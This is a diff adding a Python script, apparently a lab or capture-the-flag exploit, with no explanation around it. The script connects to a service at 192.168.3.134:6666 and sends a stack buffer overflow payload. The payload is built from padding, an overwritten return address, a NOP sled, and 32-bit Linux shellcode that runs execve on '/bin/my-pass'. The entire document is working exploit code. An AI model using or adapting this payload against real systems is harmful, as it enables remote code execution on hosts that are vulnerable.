@@ -1,0 +1,9 @@
+import socket
+import time
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('', 30303))
+sock.connect(('192.168.3.134', 6666))
+time.sleep(1)
+sock.send((b"a" * 44) + b"\x80\xfb\xff\xbf" + (b"\x90" * 172) + b"\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x2f\x6d\x79\x2d\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80")
+sock.close()
